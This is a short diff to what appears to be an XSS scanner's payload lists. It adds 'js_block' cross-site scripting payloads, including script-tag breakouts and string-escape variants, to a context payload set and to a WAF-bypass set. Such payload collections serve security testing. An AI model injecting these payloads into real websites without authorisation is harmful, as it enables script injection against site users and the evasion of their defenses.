@@ -59,6 +59,12 @@ CONTEXT_PAYLOADS = {
         "javascript:alert(1)",
         "JaVaScRiPt:alert(1)",
     ],
+    # js_block: marker is inside a <script> block but not inside a string literal
+    "js_block": [
+        "</script><script>alert(1)</script>",
+        "\";alert(1);//",
+        "';alert(1);//",
+    ],
     "html_comment": [
         "--><svg onload=alert(1)>",
     ],
@@ -109,6 +115,10 @@ WAF_BYPASS_PAYLOADS = {
     ],
     "event_handler_js_string_single": [
         "');alert`1`//",
+    ],
+    "js_block": [
+        "</script><script>alert(1)</script>",
+        '";alert`1`//',
     ],
     "html_comment": [
         "--><svg/onload=alert(1)>",
